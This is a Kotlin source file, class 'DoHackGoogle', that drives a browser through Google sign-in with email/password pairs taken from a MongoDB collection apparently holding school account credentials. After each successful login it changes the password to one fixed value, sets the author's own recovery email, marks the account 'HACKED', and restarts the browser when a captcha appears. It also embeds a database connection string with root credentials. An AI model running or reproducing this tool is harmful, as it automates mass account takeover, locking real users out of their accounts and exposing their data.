package net.scr0pt.bot.google

import net.scr0pt.bot.Page
import net.scr0pt.bot.PageManager
import net.scr0pt.bot.PageResponse
import com.mongodb.client.MongoClients
import com.mongodb.client.MongoCollection
import com.mongodb.client.model.Updates
import net.scr0pt.crawl.school.random
import org.bson.Document
import net.scr0pt.utils.webdriver.Browser


suspend fun main() {
    DoHackGoogle().run()
}


class DoHackGoogle() {
    var driver = Browser.firefox
    val mongoClient = MongoClients.create("mongodb+srv://root:mongo@cluster0-qzu3e.mongodb.net/admin")
    val serviceAccountDatabase = mongoClient.getDatabase("edu-school-account")
    val collection: MongoCollection<Document> = serviceAccountDatabase.getCollection("vimaru-email-info")

    suspend fun run() {
        while (true) {
            collection.random(org.bson.Document("login_status", null).append("email_status", null))
                ?.let { googleRun(it) }
        }
    }

    suspend fun googleRun(doc: org.bson.Document) {
        val email = doc.getString("email") ?: return
        println(email)
        val pass = doc.getString("pass") ?: return
        println(pass)
        val recoverEmail = "scr0pt.son@gmail.com"
        val newPassword = "TheMatrix@1999"


        val pageManager = PageManager(
                arrayListOf<Page>(
                        LoginEnterEmailPage(email) {
                            println("enter email success")
                        },
                        LoginEnterPasswordPage(pass) {
                            println("enter password success")
                            update(email, "login_status", "PASSWORD_CORRECT")
                        },
                        WellcomeToNewAccount {
                            update(email, "email_status", "HACKED")
                            println("WellcomeToNewAccount success")
                        },
                        ChangePasswordFirstTime(newPassword) {
                            update(email, "email_status", "HACKED")
                            update(email, "new_pass", newPassword)
                            println("ChangePasswordFirstTime success")
                        },
                        EnterPasswordFirstTimeChanged(newPassword) {
                            println("EnterPasswordFirstTimeChanged success")
                        },
                        ProtectYourAccount(ProtectYourAccount.DEFAULT_ACTION.UPDATE) {
                            //                    collection.updateOne(Document("email", email), Updates.combine(Updates.set("hacked", "Yes")))
                            println("ProtectYourAccount success")
                        },
                        ProtectYourAccountUpdatePhone() {
                            println("ProtectYourAccountUpdatePhone success")
                        },
                        ProtectYourAccountUpdateRecoverEmail(recoverEmail) {
                            println("ProtectYourAccountUpdateRecoverEmail success")
                            update(email, "recover_email", recoverEmail)
                        },
                        ProtectYourAccountUpdateRecoverEmailSuccess {
                            update(email, "recover_email", recoverEmail)
                            println("ProtectYourAccountUpdateRecoverEmailSuccess success")
                        },
                        GoogleSearch {
                            //                    collection.updateOne(Document("email", email), Updates.combine(Updates.set("hacked", "Yes")))
                            println("GoogleSearch success")
                        },
                        AccountDisable {
                            //                    collection.updateOne(
//                        Document("email", email),
//                        Updates.combine(Updates.set("hacked", "AccountDisable"))
//                    )
                            println("AccountDisable success")
                        },
                        VerifyItsYou {
                            //                    collection.updateOne(Document("email", email), Updates.combine(Updates.set("hacked", "Yes")))
                            println("VerifyItsYou success")
                        },
                        CanotLoginForYou {
                            //                    collection.updateOne(Document("email", email), Updates.combine(Updates.set("hacked", "Yes")))
                            println("CanotLoginForYou success")
                        }
                ),
                driver,
                "https://accounts.google.com/signin/v2/identifier?hl=vi&passive=true&continue=https%3A%2F%2Fwww.google.com%2F&flowName=GlifWebSignIn&flowEntry=ServiceLogin"
        )

        pageManager.generalWatingResult = { jsoupDoc, currentUrl ->
            if ((jsoupDoc.selectFirst("img#captchaimg")?.attr("src")?.length ?: 0) > 5) {
                PageResponse.RECAPTCHA()
            } else PageResponse.WAITING_FOR_RESULT()
        }

        pageManager.run { pageResponse ->
            when (pageResponse) {
                is PageResponse.NOT_OK -> {
                }
                is PageResponse.OK -> {
                    update(email, "email_status", "HACKED")
                    driver.close()
                    driver = Browser.firefox
                }
                is  PageResponse.NOT_FOUND_EMAIL -> {
                    update(email, "email_status", "NOT_EXIST")
                }
                is PageResponse.INCORECT_PASSWORD, is PageResponse.PASSWORD_CHANGED -> {
                    update(email, "login_status", "PASSWORD_INCORRECT")
                }
                is PageResponse.RECAPTCHA -> {
                    driver.close()
                    driver = Browser.firefox
                }
                is PageResponse.NOT_FOUND_ELEMENT -> {
                }
                is PageResponse.WAITING_FOR_RESULT -> {
                }
                is PageResponse.INVALID_CURRENT_PAGE -> {
                }
            }
            println(pageResponse)
        }
    }

    fun update(email: String, key: String, value: String) {
        println("Update set $key to $value when email is $email")
        collection.updateOne(Document("email", email), Updates.combine(Updates.set(key, value)))
    }
}